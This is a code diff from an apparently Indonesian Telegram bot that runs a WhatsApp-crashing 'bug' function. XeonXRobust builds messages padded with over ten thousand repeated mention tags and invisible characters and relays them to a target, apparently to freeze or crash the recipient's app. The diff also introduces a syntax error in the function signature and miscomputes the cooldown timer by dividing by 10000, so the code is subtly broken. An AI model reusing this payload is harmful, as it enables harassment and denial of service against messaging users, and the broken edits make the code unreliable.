@@ -1628,7 +1628,7 @@ bot.command("comboranz", async (ctx) => {
   // Cek apakah pengguna dalam cooldown
   if (cooldownUsers.has(userId)) {
     const remainingTime = Math.ceil(
-      (cooldownUsers.get(userId) - Date.now()) / 1000
+      (cooldownUsers.get(userId) - Date.now()) / 10000
     );
     return await ctx.reply(
       `Harap tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`
@@ -2187,7 +2187,7 @@ bot.action("option1", async (ctx) => {
 
 //===============FUNC BUG==================\\
 // [ BUG FUNCTION ]
-async function XeonXRobust(target, Ptcp = true) {
+async function XeonXRobust(sock, target);     {
   const jids = `_*~@0~*_\n`.repeat(10200);
   const ui = "ㅤ".repeat(10000);
   await sock.relayMessage(target, {
